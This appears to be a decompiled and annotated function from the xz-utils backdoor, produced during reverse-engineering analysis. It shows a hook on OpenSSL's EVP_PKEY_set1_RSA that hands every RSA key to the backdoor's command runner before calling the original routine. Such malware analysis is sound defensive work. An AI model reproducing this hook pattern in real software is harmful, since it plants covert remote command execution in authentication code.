// /home/kali/xzre-ghidra/xzregh/10A2D0_hook_EVP_PKEY_set1_RSA.c
// Function: hook_EVP_PKEY_set1_RSA @ 0x10A2D0
// Calling convention: __stdcall
// Prototype: int __stdcall hook_EVP_PKEY_set1_RSA(EVP_PKEY * pkey, RSA * key)


/*
 * AutoDoc: Tap point for EVP_PKEY_set1_RSA so the backdoor sees every RSA handle even when the decrypt hook never fires. It simply calls
 * run_backdoor_commands on the key and then invokes the preserved OpenSSL routine.
 */

#include "xzre_types.h"

int hook_EVP_PKEY_set1_RSA(EVP_PKEY *pkey,RSA *key)

{
  pfn_EVP_PKEY_set1_RSA_t orig_EVP_PKEY_set1_RSA;
  int iVar1;
  BOOL call_orig;
  
  if (((global_ctx != (global_context_t *)0x0) &&
      (global_ctx->imported_funcs != (imported_funcs_t *)0x0)) &&
     (orig_EVP_PKEY_set1_RSA = global_ctx->imported_funcs->EVP_PKEY_set1_RSA_orig,
     orig_EVP_PKEY_set1_RSA != (pfn_EVP_PKEY_set1_RSA_t)0x0)) {
    if (key != (RSA *)0x0) {
      run_backdoor_commands(key,global_ctx,&call_orig);
    }
                    /* Hook tail-call: after run_backdoor_commands() it jumps through orig_EVP_PKEY_set1_RSA, so the saved pointer call only looks like a jumptable. */
    iVar1 = (*orig_EVP_PKEY_set1_RSA)(pkey,key);
    return iVar1;
  }
  return 0;
}

